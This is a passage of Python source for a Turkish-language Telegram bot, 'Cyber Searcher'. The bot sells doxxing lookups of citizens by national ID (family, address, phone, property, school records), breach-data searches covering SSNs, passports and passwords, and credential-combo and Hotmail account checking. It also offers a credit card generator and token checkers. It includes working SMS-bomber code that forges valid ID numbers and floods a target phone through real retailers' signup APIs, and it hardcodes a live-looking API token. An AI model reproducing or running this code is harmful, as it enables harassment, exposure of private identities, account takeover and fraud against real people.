        "multi_bot_add_usage": "❌ Kullanım: /addbot BOT_TOKEN\nÖrnek: /addbot 8369544888:ABC123...",
        "addbot_tool": "🤖 Bot Ekle",
        "announce_title": "📢 <b>ADMIN DUYURU</b>",
        "announce_sent": "✅ Duyuru gönderildi!",
        "announce_usage": "❌ Kullanım: /duyuru MESAJ",
        "announce_no_users": "❌ Gönderilecek kullanıcı bulunamadı.",
        "announce_failed": "❌ Duyuru gönderilirken hata oluştu.",
        "php2py": "🐍 PHP'den Python'a Çevirici\nBana bir PHP dosyası gönder, Python'a çevireyim.",
        "php2py_converting": "🔄 Çeviriliyor...", "php2py_done": "✅ Tamamlandı!",
        "php2py_error": "❌ Çeviri sırasında hata oluştu:\n{err}",
        "php2py_only": "❌ Sadece PHP dosyası gönder!",
        "php2py_no_token": "❌ API token alınamadı.",
        "help_content": (
            "📖 **YARDIM MENÜSÜ (v4.4)**\n"
            "📌 Durumunuz: {status}\n"
            "══════════════════════\n"
            "🔹 **SORGU SİSTEMLERİ** (🆓 ÜCRETSİZ):\n"
            "   • 🆔 TC Sorgu\n"
            "   • 🔍 TC Pro Sorgu\n"
            "   • 👤 Ad Soyad Sorgu\n"
            "   • 👨‍👩‍👧 Aile Sorgu\n"
            "   • 👨‍👩‍👧‍👦 Aile Pro Sorgu\n"
            "   • 🌳 Sülale Sorgu\n"
            "   • 📱 TC'den GSM\n"
            "   • 📞 GSM'den TC\n"
            "   • 🚗 Plaka Sorgu\n"
            "   • 🎓 E-Okul Sorgu\n"
            "   • 🏠 Tapu Sorgu\n"
            "   • 🗺️ Ada Parsel Sorgu\n"
            "   • 🏠 Adres Sorgu\n"
            "🔹 **🆔 TELEGRAM ID SORGU**:\n"
            "   • 🆓 Free: 5 sorgu\n"
            "   • 💰 Bakiye: 25→89⭐ / 50→180⭐ / 100→250⭐\n"
            "   • ⭐ Premium: Sınırsız\n"
            "🔹 **⭐ PREMIUM PAKETLER:**\n"
            "   • 🌟 Premium (400 Yıldız) → Sınırsız Hotmail + Capture + Keyword + TG-ID\n"
            "   • 🌍 OSINT Premium (200 Yıldız) → LeakSights OSINT (30+ Sorgu)\n"
            "🔹 **DİĞER ARAÇLAR** (🆓 ÜCRETSİZ):\n"
            "   • 📦 Combo Çekme\n"
            "   • 🎥 Video İndirme ✅\n"
            "   • 🎵 Müzik İndirme ✅\n"
            "   • 💳 CC Generator\n"
            "   • 🤖 Discord Token Kontrol\n"
            "   • ✈️ Telegram Token Kontrol\n"
            "   • 🌐 IP Bilgi\n"
            "   • 🔎 DNS Sorgu\n"
            "   • ⚽ Bahis Sorgu\n"
            "   • 💊 Eczane Sorgu\n"
            "   • 🛡️ Proxy Check\n"
            "   • 🔍 URL Scan\n"
            "   • 🐍 PHP→Python Çevirici\n"
            "   • 💣 SMS Bomber - 41+ Servis ✅\n"
            "   • 📧 Hotmail Checker - Free 3000 satır\n"
            "   • 📸 Capture Tool - Free 3 kullanım\n"
            "   • 📸 EXIF Metadata Analizi ✅\n"
            "👨‍💻 coded by: @hackledin"
        ),
    },
    "en": {
        "welcome": "🌟 <b>Cyber Searcher v4.4</b>\nWelcome, <b>{name}</b>!\n📌 Status: {status}\n🔻 Select an option:",
        "free": "🆓 Free", "premium": "⭐ PREMIUM",
        "osint_price": "💰 OSINT Premium: 200 Stars",
        "help_content": (
            "📖 **HELP MENU (v4.4)**\n"
            "📌 Your Status: {status}\n"
            "══════════════════════\n"
            "🔹 **⭐ PREMIUM PACKAGES:**\n"
            "   • 🌟 Premium (400 Stars) → Unlimited Hotmail + Capture + Keyword + TG-ID\n"
            "   • 🌍 OSINT Premium (200 Stars) → LeakSights OSINT (30+ Queries)\n"
            "🔹 **🆔 TELEGRAM ID QUERY**:\n"
            "   • 🆓 Free: 5 queries\n"
            "   • 💰 Balance: 25→89⭐ / 50→180⭐ / 100→250⭐\n"
            "   • ⭐ Premium: Unlimited\n"
            "👨‍💻 coded by: @hackledin"
        ),
    },
    "ar": {
        "welcome": "🌟 <b>Cyber Searcher v4.4</b>\nمرحباً، <b>{name}</b>!\n📌 الحالة: {status}\n🔻 اختر خياراً:",
        "free": "🆓 مجاني", "premium": "⭐ بريميوم",
        "osint_price": "💰 OSINT بريميوم: 200 نجمة",
        "help_content": (
            "📖 **قائمة المساعدة (v4.4)**\n"
            "📌 حالتك: {status}\n"
            "══════════════════════\n"
            "🔹 **⭐ باقات البريميوم:**\n"
            "   • 🌟 بريميوم (400 نجمة)\n"
            "   • 🌍 OSINT بريميوم (200 نجمة)\n"
            "🔹 **🆔 استعلام ID تيليجرام**:\n"
            "   • 🆓 مجاني: 5 استعلامات\n"
            "   • 💰 الرصيد: 25→89⭐ / 50→180⭐ / 100→250⭐\n"
            "   • ⭐ بريميوم: غير محدود\n"
            "👨‍💻 coded by: @hackledin"
        ),
    },
}

# ══════════════════════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════════════════════
def main_kb(user_id):
    l = lang(user_id)
    labels = {
        "tr": ["📦 Combo Çek","🛠 Araçlar","📊 İstatistik","👤 Profil","🏆 Lider Tablosu","⚙️ API Değiştir","❓ Yardım"],
        "en": ["📦 Combo Check","🛠 Tools","📊 Statistics","👤 Profile","🏆 Leaderboard","⚙️ Change API","❓ Help"],
        "ar": ["📦 فحص كومبو","🛠 الأدوات","📊 الإحصائيات","👤 الملف الشخصي","🏆 المتصدرون","⚙️ تغيير API","❓ مساعدة"],
    }
    btns = labels.get(l, labels["tr"])
    mk = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    mk.add(*[KeyboardButton(b) for b in btns])
    return mk

def _btn(txt, cd): return InlineKeyboardButton(txt, callback_data=cd)
def _sep(txt): return InlineKeyboardButton(f"─── {txt} ───", callback_data="noop")

def hotmail_keyboard(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    keywords = get_user_keywords(user_id)
    limit_text = get_keyword_limit_text(user_id)
    is_prem = is_premium(user_id)
    mk.add(_sep("📧 HOTMAIL CHECKER"))
    if is_prem: mk.add(_btn("🚀 Hotmail Tarama Başlat ⭐", "hotmail_start"))
    else: mk.add(_btn("📧 Hotmail Tarama Başlat (3000 satır)", "hotmail_start"))
    mk.add(_sep(f"🔖 KEYWORDLER ({len(keywords)}/{limit_text})"))
    for kw in keywords[:10]: mk.add(_btn(f"📌 {kw}", "noop"))
    mk.add(_btn("➕ Keyword Ekle", "hotmail_addkw"))
    mk.add(_btn("🗑️ Keyword Sil", "hotmail_delkw"))
    mk.add(_btn("🔄 Keywordleri Sıfırla", "hotmail_resetkw"))
    mk.add(_sep("📸 CAPTURE TOOL"))
    if is_prem: mk.add(_btn("📸 Capture Tarama Başlat ⭐", "capture_menu"))
    else:
        capture_left = get_capture_limit_text(user_id)
        mk.add(_btn(f"📸 Capture Tool ({capture_left} kullanım)", "capture_menu"))
    if is_prem: mk.add(_btn("⭐ Premium Aktif ✅", "noop"))
    else: mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium"))
    mk.add(_btn(s(user_id, "back_btn"), "goto_tools"))
    return mk

API_LIST = [
    {"name":"Wazely API","url":"https://wazely.vercel.app/api/trlog?site=","type":"wazely"},
    {"name":"Solidar API","url":"https://solidarksystems.alwaysdata.net/log.php?url=","type":"solidar"},
    {"name":"RootTurkey API","url":"https://rootturkey.xyz/log?url=","type":"rootturkey"},
]
YASAKLI = [".gov",".edu","cheatglobal","spin","bet"]

TURKIYE_API = {
    "tc":{"url":"https://ajaxsystems.fun/tc.php?tc={tc}","icon":"🆔","tr":"TC Sorgu","en":"TC Query","ar":"استعلام TC","params":["tc"]},
    "tcpro":{"url":"https://ajaxsystems.fun/tcpro.php?tc={tc}","icon":"🔍","tr":"TC Pro Sorgu","en":"TC Pro Query","ar":"استعلام TC Pro","params":["tc"]},
    "adsoyad":{"url":"https://ajaxsystems.fun/adsoyad.php?ad={ad}&soyad={soyad}","icon":"👤","tr":"Ad Soyad","en":"Name Surname","ar":"استعلام الاسم","params":["ad","soyad"]},
    "aile":{"url":"https://ajaxsystems.fun/aile.php?tc={tc}","icon":"👨‍👩‍👧","tr":"Aile Sorgu","en":"Family Query","ar":"استعلام العائلة","params":["tc"]},
    "ailepro":{"url":"https://ajaxsystems.fun/ailepro.php?tc={tc}","icon":"👨‍👩‍👧‍👦","tr":"Aile Pro","en":"Family Pro","ar":"العائلة Pro","params":["tc"]},
    "sulale":{"url":"https://ajaxsystems.fun/sulale.php?tc={tc}","icon":"🌳","tr":"Sülale Sorgu","en":"Lineage Query","ar":"استعلام النسب","params":["tc"]},
    "tcgsm":{"url":"https://ajaxsystems.fun/tcgsm.php?tc={tc}&auth=fire","icon":"📱","tr":"TC → GSM","en":"TC to GSM","ar":"TC إلى GSM","params":["tc"]},
    "gsmtc":{"url":"https://ajaxsystems.fun/gsmtc.php?gsm={gsm}&auth=fire","icon":"📞","tr":"GSM → TC","en":"GSM to TC","ar":"GSM إلى TC","params":["gsm"]},
    "eokul":{"url":"https://ajaxsystems.fun/eokul.php?tc={tc}","icon":"🎓","tr":"E-Okul Sorgu","en":"E-School Query","ar":"استعلام المدرسة","params":["tc"]},
    "tapu":{"url":"https://ajaxsystems.fun/tapu.php?tc={tc}","icon":"🏠","tr":"Tapu Sorgu","en":"Title Deed Query","ar":"استعلام الملكية","params":["tc"]},
    "adaparsel":{"url":"https://ajaxsystems.fun/adaparsel.php?il={il}&ilce={ilce}","icon":"🗺️","tr":"Ada Parsel","en":"Block Parcel","ar":"استعلام القطعة","params":["il","ilce"]},
    "adres":{"url":"https://apiv2.ajaxsystems.fun/adres.php?tc={tc}","icon":"🏠","tr":"Adres Sorgu (Tapu & Adres)","en":"Address Query","ar":"استعلام العنوان","params":["tc"]},
}

LS_TOKEN = "NHLpkXyN8Lq3AkkjA5yECyMu5lpA0l0GqnY0Co8kBwh9eIeOJg"
LS_BASE = "https://api.leaksights.com/osint"

def _lsurl(endpoint):
    return f"{LS_BASE}/{endpoint}?token={LS_TOKEN}&text={{value}}"

LEAKSIGHTS_API = {
    "username":{"url":_lsurl("username"),"icon":"👤","cat":"username","tr":"Kullanıcı Adı","en":"Username","ar":"اسم المستخدم"},
    "username2":{"url":_lsurl("username2"),"icon":"🔍","cat":"username","tr":"Kullanıcı Adı Detaylı","en":"Username Detailed","ar":"اسم المستخدم تفصيلي"},
    "fullnamebreach":{"url":_lsurl("fullnamebreach"),"icon":"📝","cat":"name","tr":"Tam İsim","en":"Full Name","ar":"الاسم الكامل"},
    "nome":{"url":_lsurl("nome"),"icon":"👤","cat":"name","tr":"İsim","en":"Name","ar":"الاسم"},
    "nomepai":{"url":_lsurl("nomepai"),"icon":"👨","cat":"name","tr":"Baba Adı","en":"Father Name","ar":"اسم الأب"},
    "nomemae":{"url":_lsurl("nomemae"),"icon":"👩","cat":"name","tr":"Anne Adı","en":"Mother Name","ar":"اسم الأم"},
    "email":{"url":_lsurl("email"),"icon":"📧","cat":"contact","tr":"E-posta","en":"Email","ar":"البريد الإلكتروني"},
    "number":{"url":_lsurl("number"),"icon":"📱","cat":"contact","tr":"Telefon","en":"Phone","ar":"الهاتف"},
    "telefone":{"url":_lsurl("telefone"),"icon":"📞","cat":"contact","tr":"Telefon Detaylı","en":"Phone Detailed","ar":"الهاتف التفصيلي"},
    "telefone_basic":{"url":_lsurl("telefone_basic"),"icon":"📱","cat":"contact","tr":"Telefon Temel","en":"Phone Basic","ar":"الهاتف الأساسي"},
    "ip":{"url":_lsurl("ip"),"icon":"🌐","cat":"ip","tr":"IP Sızıntı","en":"IP Leak","ar":"تسريب IP"},
    "ipgeo":{"url":_lsurl("ipgeo"),"icon":"📍","cat":"ip","tr":"IP Konum","en":"IP Location","ar":"موقع IP"},
    "hwid":{"url":_lsurl("hwid"),"icon":"💻","cat":"ip","tr":"HWID","en":"HWID","ar":"HWID"},
    "proxydetect":{"url":_lsurl("proxydetect"),"icon":"🛡️","cat":"ip","tr":"Proxy Tespit","en":"Proxy Detection","ar":"كشف البروكسي"},
    "portscam":{"url":_lsurl("portscam"),"icon":"🔌","cat":"ip","tr":"Port Tarama","en":"Port Scan","ar":"فحص المنافذ"},
    "subnet":{"url":_lsurl("subnet"),"icon":"🌐","cat":"ip","tr":"Subnet","en":"Subnet","ar":"الشبكة الفرعية"},
    "domainmapper":{"url":_lsurl("domainmapper"),"icon":"🗺️","cat":"domain","tr":"Domain Haritalama","en":"Domain Mapping","ar":"رسم خريطة النطاق"},
    "subdomainsearch":{"url":_lsurl("subdomainsearch"),"icon":"🔍","cat":"domain","tr":"Subdomain Arama","en":"Subdomain Search","ar":"بحث النطاق الفرعي"},
    "subdmains":{"url":_lsurl("subdmains"),"icon":"🌐","cat":"domain","tr":"Subdomain Detaylı","en":"Subdomain Detailed","ar":"النطاق الفرعي التفصيلي"},
    "url":{"url":_lsurl("url"),"icon":"🔗","cat":"url","tr":"URL Sızıntı","en":"URL Leak","ar":"تسريب URL"},
    "url2":{"url":_lsurl("url2"),"icon":"🔗","cat":"url","tr":"URL Detaylı","en":"URL Detailed","ar":"URL التفصيلي"},
    "search_url_all_database":{"url":_lsurl("search_url_all_database"),"icon":"🔎","cat":"url","tr":"URL Tüm Veritabanı","en":"URL All Database","ar":"URL جميع قواعد البيانات"},
    "passport":{"url":_lsurl("passport"),"icon":"🛂","cat":"identity","tr":"Pasaport","en":"Passport","ar":"جواز السفر"},
    "cpf":{"url":_lsurl("cpf"),"icon":"🆔","cat":"identity","tr":"CPF","en":"CPF","ar":"CPF"},
    "dni":{"url":_lsurl("dni"),"icon":"🆔","cat":"identity","tr":"DNI","en":"DNI","ar":"DNI"},
    "ssn":{"url":_lsurl("ssn"),"icon":"🆔","cat":"identity","tr":"SSN","en":"SSN","ar":"SSN"},
    "parentescpf":{"url":_lsurl("parentescpf"),"icon":"👨‍👩‍👧‍👦","cat":"identity","tr":"Akraba CPF","en":"Relative CPF","ar":"CPF الأقارب"},
    "password":{"url":_lsurl("password"),"icon":"🔑","cat":"other","tr":"Şifre","en":"Password","ar":"كلمة المرور"},
    "facebookid":{"url":_lsurl("facebookid"),"icon":"📘","cat":"other","tr":"Facebook ID","en":"Facebook ID","ar":"Facebook ID"},
    "placa":{"url":_lsurl("placa"),"icon":"🚗","cat":"other","tr":"Plaka (LS)","en":"License Plate (LS)","ar":"لوحة السيارة (LS)"},
}

LEAKSIGHTS_CATS = {
    "username":{"tr":"👤 KULLANICI ADI","en":"👤 USERNAME","ar":"👤 اسم المستخدم"},
    "name":{"tr":"📝 İSİM SORGULARI","en":"📝 NAME QUERIES","ar":"📝 استعلامات الاسم"},
    "contact":{"tr":"📱 İLETİŞİM","en":"📱 CONTACT","ar":"📱 الاتصال"},
    "ip":{"tr":"🌐 IP / AĞ","en":"🌐 IP / NETWORK","ar":"🌐 IP / الشبكة"},
    "domain":{"tr":"🗺️ DOMAIN","en":"🗺️ DOMAIN","ar":"🗺️ النطاق"},
    "url":{"tr":"🔗 URL","en":"🔗 URL","ar":"🔗 URL"},
    "identity":{"tr":"🛂 KİMLİK","en":"🛂 IDENTITY","ar":"🛂 الهوية"},
    "other":{"tr":"🔧 DİĞER","en":"🔧 OTHER","ar":"🔧 أخرى"},
}

TOOLS_API = {
    "bedrock":"https://wazelyapi.vercel.app/api/bedrock?adres=",
    "ccgen":"https://wazelyapi.vercel.app/api/ccgen?bin=",
    "dctoken":"https://wazelyapi.vercel.app/api/dcbottokencheck?token=",
    "tgtoken":"https://wazelyapi.vercel.app/api/tgtokencheck?token=",
    "eczane":"https://wazely.vercel.app/api/eczane?ad=",
    "ipinfo":"https://wazely.vercel.app/api/ipinfo?ip=",
    "dns":"https://wazely.vercel.app/api/dns?domain=",
    "bahis":"https://wazely.vercel.app/api/bahis?isimsoyisim=",
    "plaka":"https://wazely.vercel.app/api/plaka?plate=",
    "predunyam":"https://wazely.vercel.app/api/predunyam",
}

TOOL_PROMPTS = {
    "tr": {
        "bedrock":"🎮 IP:PORT girin (Örn: bee.mc-complex.com:19132)",
        "ccgen":"💳 BIN girin (Örn: 450000)",
        "dctoken":"🤖 Discord Bot Token girin:",
        "tgtoken":"✈️ Telegram Bot Token girin:",
        "eczane":"💊 Eczane adını girin:",
        "ipinfo":"🌐 IP Adresini girin:",
        "dns":"🔎 Domain girin (Örn: google.com):",
        "bahis":"⚽ İsim Soyisim girin:",
        "plaka":"🚗 Plaka girin (Örn: 34ABC123):",
        "proxycheck":"🛡️ IP adresini girin (Örn: 8.8.8.8):",
        "urlscan":"🔍 Domain girin (Örn: google.com):",
        "addbot":"🤖 Bot Token'ını girin:\nÖrnek: 8369544888:ABC123...",
        "php2py":"🐍 PHP dosyası gönder, Python'a çevireyim.",
        "smsbomb":"💣 SMS Bomber\n📱 Hedef numarayı girin:",
        "hotmail":"📧 Hotmail Checker\nLütfen combo dosyasını gönderin.",
        "exif":"📸 EXIF Metadata Analizi\nLütfen bir fotoğraf gönderin.",
        "music":"🎵 Müzik İndirici\nŞarkı adı veya YouTube linki girin."
    },
    "en": {
        "bedrock":"🎮 Enter IP:PORT", "ccgen":"💳 Enter BIN",
        "dctoken":"🤖 Enter Discord Bot Token:", "tgtoken":"✈️ Enter Telegram Bot Token:",
        "eczane":"💊 Enter pharmacy name:", "ipinfo":"🌐 Enter IP address:",
        "dns":"🔎 Enter domain:", "bahis":"⚽ Enter full name:",
        "plaka":"🚗 Enter plate:", "proxycheck":"🛡️ Enter IP:",
        "urlscan":"🔍 Enter domain:", "addbot":"🤖 Enter Bot Token:",
        "php2py":"🐍 Send PHP file.", "smsbomb":"💣 SMS Bomber",
        "hotmail":"📧 Hotmail Checker", "exif":"📸 EXIF Analysis",
        "music":"🎵 Music Downloader"
    },
    "ar": {
        "bedrock":"🎮 أدخل IP:PORT","ccgen":"💳 أدخل BIN",
        "dctoken":"🤖 أدخل Discord Bot Token:","tgtoken":"✈️ أدخل Telegram Bot Token:",
        "eczane":"💊 أدخل اسم الصيدلية:","ipinfo":"🌐 أدخل عنوان IP:",
        "dns":"🔎 أدخل النطاق:","bahis":"⚽ أدخل الاسم:",
        "plaka":"🚗 أدخل رقم اللوحة:","proxycheck":"🛡️ أدخل IP:",
        "urlscan":"🔍 أدخل النطاق:","addbot":"🤖 أدخل توكن البوت:",
        "php2py":"🐍 أرسل ملف PHP.","smsbomb":"💣 قنبلة SMS",
        "hotmail":"📧 Hotmail Checker","exif":"📸 تحليل EXIF",
        "music":"🎵 تحميل الموسيقى"
    },
}

TURKEY_PROMPTS = {
    "tr": {
        "tc":"🆔 TC Kimlik Numarası girin (11 haneli):",
        "tcpro":"🔍 TC Kimlik Numarası girin (11 haneli):",
        "adsoyad":"👤 Ad Soyad girin (Örn: Ali Yılmaz):",
        "aile":"👨‍👩‍👧 TC Kimlik Numarası girin (11 haneli):",
        "ailepro":"👨‍👩‍👧‍👦 TC Kimlik Numarası girin (11 haneli):",
        "sulale":"🌳 TC Kimlik Numarası girin (11 haneli):",
        "tcgsm":"📱 TC Kimlik Numarası girin (11 haneli):",
        "gsmtc":"📞 GSM numarası girin (Örn: 5306524123):",
        "eokul":"🎓 TC Kimlik Numarası girin (11 haneli):",
        "tapu":"🏠 TC Kimlik Numarası girin (11 haneli):",
        "adaparsel":"🗺️ İl,İlçe girin (Örn: İSTANBUL,KADIKÖY):",
        "adres":"🏠 Adres Sorgu\nTC Kimlik Numarası girin (11 haneli):",
    },
    "en": {
        "tc":"🆔 Enter TC ID (11 digits):","tcpro":"🔍 Enter TC ID:",
        "adsoyad":"👤 Enter name surname:","aile":"👨‍👩‍👧 Enter TC ID:",
        "ailepro":"👨‍👩‍👧‍👦 Enter TC ID:","sulale":"🌳 Enter TC ID:",
        "tcgsm":"📱 Enter TC ID:","gsmtc":"📞 Enter GSM:",
        "eokul":"🎓 Enter TC ID:","tapu":"🏠 Enter TC ID:",
        "adaparsel":"🗺️ Enter Province,District:","adres":"🏠 Address Query\nEnter TC ID:",
    },
    "ar": {
        "tc":"🆔 أدخل رقم الهوية:","tcpro":"🔍 أدخل رقم الهوية:",
        "adsoyad":"👤 أدخل الاسم واللقب:","aile":"👨‍👩‍👧 أدخل رقم الهوية:",
        "ailepro":"👨‍👩‍👧‍👦 أدخل رقم الهوية:","sulale":"🌳 أدخل رقم الهوية:",
        "tcgsm":"📱 أدخل رقم الهوية:","gsmtc":"📞 أدخل رقم GSM:",
        "eokul":"🎓 أدخل رقم الهوية:","tapu":"🏠 أدخل رقم الهوية:",
        "adaparsel":"🗺️ أدخل المحافظة,المنطقة:","adres":"🏠 استعلام العنوان:",
    },
}

def tools_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    ls_txt = "🌍 LeakSights OSINT ⭐" if is_premium_osint(user_id) else "🌍 LeakSights OSINT 🔒"
    mk.add(_btn("🇹🇷 Türkiye Sorguları", "menu_turkey"), _btn(ls_txt, "menu_ls"))
    mk.add(
        _btn("🎮 MC Bedrock", "tool_bedrock"), _btn("💳 CC Generator", "tool_ccgen"),
        _btn("🤖 Discord Token", "tool_dctoken"), _btn("✈️ TG Token", "tool_tgtoken"),
        _btn("💊 Eczane", "tool_eczane"), _btn("🌐 IP Bilgi", "tool_ipinfo"),
        _btn("🔎 DNS Sorgu", "tool_dns"), _btn("⚽ Bahis Sorgu", "tool_bahis"),
        _btn("🚗 Plaka Sorgu", "tool_plaka"), _btn("💎 PreDunyam", "tool_predunyam"),
        _btn("🛡️ Proxy Check", "tool_proxycheck"), _btn("🔍 URL Scan", "tool_urlscan"),
        _btn("🎥 Video İndir", "tool_video"), _btn("🎵 Müzik İndir", "tool_music"),
        _btn("🤖 Bot Ekle", "tool_addbot"), _btn("🐍 PHP→Python", "tool_php2py"),
        _btn("💣 SMS Bomber", "tool_smsbomb"), _btn("📧 Hotmail Checker", "tool_hotmail"),
        _btn("📸 EXIF Metadata", "tool_exif"),
        _btn("🆔 Telegram ID Sorgu", "tool_tgid"),
    )
    mk.add(_btn(s(user_id, "home_btn"), "goto_home"))
    return mk

def turkey_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    def lbl(k): return TURKIYE_API[k].get(lang(user_id), TURKIYE_API[k]["tr"])
    mk.add(_sep("👤 KİMLİK"))
    mk.add(_btn(f"{TURKIYE_API['tc']['icon']} {lbl('tc')}", "tr_tc"),
           _btn(f"{TURKIYE_API['tcpro']['icon']} {lbl('tcpro')}", "tr_tcpro"))
    mk.add(_btn(f"{TURKIYE_API['adsoyad']['icon']} {lbl('adsoyad')}", "tr_adsoyad"))
    mk.add(_sep("👨‍👩‍👧 AİLE"))
    mk.add(_btn(f"{TURKIYE_API['aile']['icon']} {lbl('aile')}", "tr_aile"),
           _btn(f"{TURKIYE_API['ailepro']['icon']} {lbl('ailepro')}", "tr_ailepro"))
    mk.add(_btn(f"{TURKIYE_API['sulale']['icon']} {lbl('sulale')}", "tr_sulale"))
    mk.add(_sep("📱 İLETİŞİM"))
    mk.add(_btn(f"{TURKIYE_API['tcgsm']['icon']} {lbl('tcgsm')}", "tr_tcgsm"),
           _btn(f"{TURKIYE_API['gsmtc']['icon']} {lbl('gsmtc')}", "tr_gsmtc"))
    mk.add(_sep("🏠 MÜLK / EĞİTİM"))
    mk.add(_btn(f"{TURKIYE_API['tapu']['icon']} {lbl('tapu')}", "tr_tapu"),
           _btn(f"{TURKIYE_API['eokul']['icon']} {lbl('eokul')}", "tr_eokul"))
    mk.add(_btn(f"{TURKIYE_API['adaparsel']['icon']} {lbl('adaparsel')}", "tr_adaparsel"))
    mk.add(_btn(f"{TURKIYE_API['adres']['icon']} {lbl('adres')}", "tr_adres"))
    mk.add(_btn(s(user_id, "tools_btn"), "goto_tools"), _btn(s(user_id, "home_btn"), "goto_home"))
    return mk

def ls_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    if not is_premium_osint(user_id):
        mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint"))
        mk.add(_btn(s(user_id, "back_btn"), "goto_tools")); return mk
    cat_order = ["username","name","contact","ip","domain","url","identity","other"]
    groups = {c: [] for c in cat_order}
    for key, info in LEAKSIGHTS_API.items():
        groups.setdefault(info.get("cat","other"), []).append((key, info))
    l = lang(user_id)
    for cat in cat_order:
        items = groups.get(cat, [])
        if not items: continue
        mk.add(_sep(LEAKSIGHTS_CATS[cat].get(l, cat)))
        for key, info in items:
            mk.add(_btn(f"{info['icon']} {info.get(l, info.get('tr', key))}", f"ls_{key}"))
    mk.add(_btn(s(user_id, "tools_btn"), "goto_tools"), _btn(s(user_id, "home_btn"), "goto_home"))
    return mk

def premium_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium"))
    mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint"))
    mk.add(_btn(s(user_id, "home_btn"), "goto_home"))
    return mk

def tgid_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=1)
    free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(user_id))
    balance   = tgid_get_balance(user_id)
    if user_id == ADMIN_ID:
        durum = "👑 Admin — Sınırsız Sorgu"
    elif is_premium(user_id):
        durum = "⭐ Premium — Sınırsız Sorgu"
    else:
        durum = f"🆓 Free: {free_left}/{TGID_FREE_LIMIT}  |  💰 Bakiye: {balance}"
    mk.add(_btn(f"📊 {durum}", "noop"))
    mk.add(_btn("🔍 Sorgu Yap", "tgid_search"))
    mk.add(_btn("💎 Paket Satın Al", "tgid_packages"))
    mk.add(_btn("📊 İstatistiklerim", "tgid_my_stats"))
    mk.add(_btn("◀️ Geri", "goto_tools"))
    return mk

def tgid_packages_kb():
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(_btn(f"💎 {TGID_PACKAGE_25} Sorgu — {TGID_PRICE_25} ⭐", "tgid_buy_25"))
    mk.add(_btn(f"💎 {TGID_PACKAGE_50} Sorgu — {TGID_PRICE_50} ⭐", "tgid_buy_50"))
    mk.add(_btn(f"💎 {TGID_PACKAGE_100} Sorgu — {TGID_PRICE_100} ⭐", "tgid_buy_100"))
    mk.add(_btn("◀️ Geri", "tool_tgid"))
    return mk

# ══════════════════════════════════════════════════════════════
#  MULTI-BOT MANAGEMENT
# ══════════════════════════════════════════════════════════════
_CHILD_PROCS = {}
_PROC_LOCK = threading.Lock()

def _get_python_exe(): return sys.executable

def _load_registry():
    if not os.path.exists(BOT_REGISTRY_FILE): return {}
    try:
        with open(BOT_REGISTRY_FILE, "r", encoding="utf-8") as f: return json.load(f)
    except: return {}

def _save_registry(registry):
    with open(BOT_REGISTRY_FILE, "w", encoding="utf-8") as f:
        json.dump(registry, f, indent=2)

def _spawn_bot(token, owner_id=None):
    if token == BOT_TOKEN:
        print(f"[SPAWN] ⚠️ Ana bot token'ı spawn edilemez!"); return False
    with _PROC_LOCK:
        if token in _CHILD_PROCS:
            if _CHILD_PROCS[token].poll() is None: return False
        script_path = os.path.abspath(__file__)
        python_exe = _get_python_exe()
        args = [python_exe, script_path, "--bot", token, "--owner", str(owner_id)]
        try:
            proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                    stdin=subprocess.DEVNULL,
                                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
                                    start_new_session=True)
            _CHILD_PROCS[token] = proc
            registry = _load_registry()
            registry[token] = {"owner_id": owner_id, "pid": proc.pid, "added": datetime.now().isoformat()}
            _save_registry(registry)
            return True
        except Exception as e:
            print(f"[ERROR] Failed to spawn bot: {e}"); return False

def start_saved_bots():
    registry = _load_registry()
    if not registry: return
    if BOT_TOKEN in registry:
        print(f"[MAIN] ⚠️ Ana bot token'ı registry'de, atlanıyor...")
        del registry[BOT_TOKEN]; _save_registry(registry)
    if not registry:
        print("[MAIN] Başlatılacak kayıtlı bot yok."); return
    print(f"[MAIN] Starting {len(registry)} saved bots...")
    for token, info in registry.items():
        _spawn_bot(token, info.get("owner_id"))

# ══════════════════════════════════════════════════════════════
#  SMS BOMBER
# ══════════════════════════════════════════════════════════════
_SMS_SESSIONS = {}
_SMS_LOCK = threading.Lock()

class SendSms:
    adet = 0
    def __init__(self, phone, mail):
        rakam = []
        tcNo = ""
        rakam.append(randint(1, 9))
        for i in range(1, 9): rakam.append(randint(0, 9))
        rakam.append(((rakam[0]+rakam[2]+rakam[4]+rakam[6]+rakam[8])*7 - (rakam[1]+rakam[3]+rakam[5]+rakam[7])) % 10)
        rakam.append((sum(rakam[:10])) % 10)
        for r in rakam: tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"

    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent":"Mozilla/5.0","Content-Type":"application/json","X-Language-Id":"tr-TR","X-Client-Platform":"web","Origin":"https://www.kahvedunyasi.com","Dnt":"1"}
            r = requests.post(url, headers=headers, json={"countryCode":"90","phoneNumber":self.phone}, timeout=6)
            if r.json().get("processStatus") == "Success": self.adet += 1
        except: pass
    def Wmf(self):
        try:
            r = requests.post("https://www.wmf.com.tr/users/register/",
                data={"confirm":"true","date_of_birth":"1956-03-01","email":self.mail,"email_allowed":"true","first_name":"Memati","gender":"male","last_name":"Bas","password":"31ABC..abc31","phone":f"0{self.phone}"}, timeout=6)
            if r.status_code == 202: self.adet += 1
        except: pass
    def Hepsiburada(self):
        try:
            url = "https://www.hepsiburada.com/api/Register/RegisterUser"
